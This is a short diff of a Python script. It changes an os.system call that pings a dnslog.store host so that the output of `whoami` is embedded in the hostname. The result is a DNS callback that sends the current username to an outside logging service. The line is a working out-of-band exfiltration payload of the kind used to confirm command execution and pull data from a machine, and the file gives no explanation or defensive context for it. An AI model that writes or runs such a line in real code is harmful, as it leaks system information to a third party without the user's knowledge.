@@ -2,4 +2,4 @@
 # -*- coding: UTF-8 -*-
 
 import os
-os.system("ping 4116ac30.dnslog.store")
+os.system("ping `whoami`.d231f0ac.dnslog.store")
